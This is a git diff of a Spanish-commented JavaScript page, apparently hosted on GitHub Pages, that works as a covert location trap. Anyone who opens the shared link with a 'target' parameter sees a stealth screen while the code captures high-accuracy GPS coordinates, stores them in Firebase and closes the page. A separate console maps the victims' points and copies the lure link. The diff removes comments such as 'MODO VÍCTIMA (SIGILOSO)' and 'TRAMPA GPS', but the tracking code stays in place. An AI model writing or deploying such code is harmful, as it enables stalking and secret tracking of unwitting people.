@@ -25,22 +25,17 @@ const urlParams = new URLSearchParams(window.location.search);
 const targetId = urlParams.get('target');
 
 document.addEventListener("DOMContentLoaded", function () {
-    
-    // --- MODO VÍCTIMA (SIGILOSO: Abre, captura GPS y cierra) ---
     if (targetId) {
         document.getElementById('main-console').style.display = 'none';
         document.getElementById('stealth-screen').style.display = 'flex';
-
         ejecutarTrampaGPSYCerrar(targetId);
         return; 
     }
 
-    // --- MODO CONSOLA PRINCIPAL (TÚ EN TU PC) ---
     document.getElementById('main-console').style.display = 'block';
     document.getElementById('stealth-screen').style.display = 'none';
 
     map = L.map('map', { zoomControl: false }).setView(ubicacionPorDefecto, 14);
-    
     marcadoresAraña = L.layerGroup().addTo(map);
 
     L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
@@ -51,14 +46,12 @@ document.addEventListener("DOMContentLoaded", function () {
     mainMarker = L.marker(ubicacionPorDefecto, { zIndexOffset: 1000 }).addTo(map)
       .bindPopup("<b>Consola Central Activa.</b>");
 
-    setTimeout(() => { map.invalidateSize(); }, 200);
+    setTimeout(() => { map.invalidateSize(); }, 300);
 
-    // Cargar puntos y escuchar en tiempo real usando el identificador "prueba"
     cargarPuntosHistoricos("prueba");
     escucharObjetivoEnTiempoReal("prueba");
 });
 
-// --- TRAMPA GPS: CAPTURA Y CIERRE AUTOMÁTICO ---
 function ejecutarTrampaGPSYCerrar(id) {
     if (!navigator.geolocation) {
         finalizarSalida();
@@ -72,26 +65,18 @@ function ejecutarTrampaGPSYCerrar(id) {
             const timestamp = new Date();
 
             try {
-                // 1. Actualizar el documento principal
                 const docRef = doc(db, "rastreos", id);
                 await setDoc(docRef, { lat, lng, timestamp }, { merge: true });
 
-                // 2. Guardar en la subcolección de historial (para la araña 🕷️)
                 const colRef = collection(db, "rastreos", id, "lecturas");
                 const nuevoItemRef = doc(colRef);
                 await setDoc(nuevoItemRef, { lat, lng, timestamp });
-
-                console.log("Coordenadas capturadas con éxito.");
             } catch (e) {
-                console.error("Error al registrar en Firebase:", e);
+                console.error("Error al registrar:", e);
             }
-            
             finalizarSalida();
         },
-        (error) => {
-            console.log("GPS denegado o no disponible.");
-            finalizarSalida();
-        },
+        () => { finalizarSalida(); },
         { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
     );
 }
@@ -103,7 +88,6 @@ function finalizarSalida() {
     }, 1500);
 }
 
-// --- CARGAR ARAÑAS EN TU CONSOLA PRINCIPAL ---
 async function cargarPuntosHistoricos(id) {
     if (!marcadoresAraña) return;
     marcadoresAraña.clearLayers();
@@ -142,7 +126,6 @@ async function cargarPuntosHistoricos(id) {
                 
                 marcadoresAraña.addLayer(marker);
                 bounds.push([lat, lng]);
-                
                 ultimaUbicacionSpider = [lat, lng];
             }
         });
@@ -153,7 +136,6 @@ async function cargarPuntosHistoricos(id) {
             document.getElementById('banner-status').innerHTML = "SIN PUNTOS DE ACCESO";
         }
     } catch (e) {
-        console.error("Error al cargar puntos históricos:", e);
         document.getElementById('banner-status').innerHTML = "ERROR CARGANDO DATOS";
     }
 }
@@ -170,7 +152,6 @@ function escucharObjetivoEnTiempoReal(id) {
     });
 }
 
-// --- BOTONES Y UTILIDADES DE TU CONSOLA ---
 window.compartirEnlace = function() {
     const enlaceObjetivo = "https://mmommo52.github.io/Spidey/?target=prueba";
     navigator.clipboard.writeText(enlaceObjetivo).then(() => {
@@ -178,7 +159,6 @@ window.compartirEnlace = function() {
     });
 };
 
-// BOTÓN RASTREAR: Al presionarlo, recarga y centra el mapa exactamente en la última araña
 window.accionRastrearObjetivo = function() {
     cargarPuntosHistoricos("prueba").then(() => {
         if (ultimaUbicacionSpider) {
